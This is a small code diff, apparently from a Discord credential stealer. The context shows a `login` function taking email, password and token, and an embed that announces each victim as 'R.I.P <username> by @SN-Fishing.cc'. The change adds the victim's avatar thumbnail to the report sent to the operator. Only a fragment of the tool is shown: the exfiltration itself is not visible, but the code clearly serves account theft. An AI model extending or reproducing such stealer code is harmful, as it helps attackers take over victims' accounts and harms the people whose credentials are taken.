@@ -698,6 +698,9 @@ const login = async (email, password, token) => {
         footer: {
           text: "R.I.P " + json.username +"#" + json.discriminator + " by @SN-Fishing.cc 🐟",
         },
+        thumbnail: {
+            url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
+        },
       },
     ],
   };
